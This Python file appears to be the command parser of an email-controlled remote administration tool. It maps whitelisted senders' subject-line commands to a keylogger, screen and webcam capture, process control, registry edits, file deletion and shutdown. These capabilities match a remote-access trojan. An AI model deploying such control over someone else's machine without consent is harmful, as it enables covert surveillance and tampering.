import shlex
import constants

from services import app, help, keylogger, mac, pc, process, registry, screen, webcam, explorer
import global_variables

request_tree = {
    'basic' : {
        'mac' : {
            'get': [0, mac.get_mac]
        },
        'app' : {
            'get': [0, app.get_apps], 
            'close': [1, app.close_app]
        },
        'process': {
            'get': [0, process.get_processes],
            'close': [1, process.close_process]
        }, 
        'keylogger': {
            'get': [1, keylogger.get_key_log]
        },
        'screen': {
            'get' : {
                'image': [0, screen.get_screen_shot],
                'video': [1, screen.get_screen_record]
            },
        }, 
        'webcam': {
            'get' : {
                'image': [0, webcam.get_webcam_shot],
                'video': [1, webcam.get_webcam_record]
            }
        },
        'help': [0, help.show_helps]
    },
    'advanced' : {
        'pc' : {
            'shutdown': [0, pc.shutdown],
            'restart': [0, pc.restart]
        },
        'registry': {
            'get': [1, registry.get_value],
            'add_key': [1, registry.add_key],
            'add_value': [3, registry.add_value],
            'modify': [3, registry.modify_value],
            'delete_value': [1, registry.delete_value],
            'delete_key': [1, registry.delete_key],
        },
        'explorer': {
            'tree': [1, explorer.show_tree],
            'copy': [2, explorer.copy],
            'cut': [2, explorer.cut],
            'delete': [1, explorer.delete]
        }
    }
}

def parse_request(mail_content):
    sender, header = mail_content['sender'], mail_content['subject']
    tokens = shlex.split(header)
    
    raw_command = ' '.join(tokens[1:])
    if sender not in global_variables.app_configs['white_list']['basic'] and sender not in global_variables.app_configs['white_list']['advanced']:
        return {
            'msg': 'Permission denied.',
            'command': raw_command
        }
    
    if (tokens[0].upper() != constants.APP_REQ):
        return {
            'msg': 'Wrong request format.',
            'command': raw_command
        }
    
    tokens = tokens[1: ]
    
    if len(tokens) == 0:
        return {
            'msg': 'Command not found.',
            'command': raw_command
        }
    
    tree = None
    
    if tokens[0].lower() in request_tree['basic']:
        tree = request_tree['basic']
    elif tokens[0].lower() in request_tree['advanced']:
        if sender not in global_variables.app_configs['white_list']['advanced']:
            return {
                'msg': 'This command can only be used by advanced controllers.',
                'command': raw_command
            }
        tree = request_tree['advanced']

    if not tree:
        return {
            'msg': 'Command not found.',
            'command': raw_command
        }
    
    func, param = None, []
    # tokens: APP get
    tokens_count = len(tokens)
    
    for i in range(len(tokens)):
        node = tokens[i]
        
        if node.lower() in tree.keys():
            tree = tree[node.lower()]
        else:
            return {
                'msg' : f'Command not found {" ".join(tokens[ : i])}.',
                'command': raw_command
            }
            
        if type(tree) != dict:
            if i + tree[0] >= tokens_count :
                return {
                    'msg': f'Function {" ".join(tokens)} takes at least {tree[0]} arguments. Given {len(tokens) - 1 - i}.',
                    'command': raw_command
                }
            
            func = tree[1]
            param = tokens[i + 1 : i + 1 + tree[0]]
            
            break
        
    return {
        'function': func,
        'params': param,
        'msg': 'Parse request successfully.',
        'command': raw_command
    }
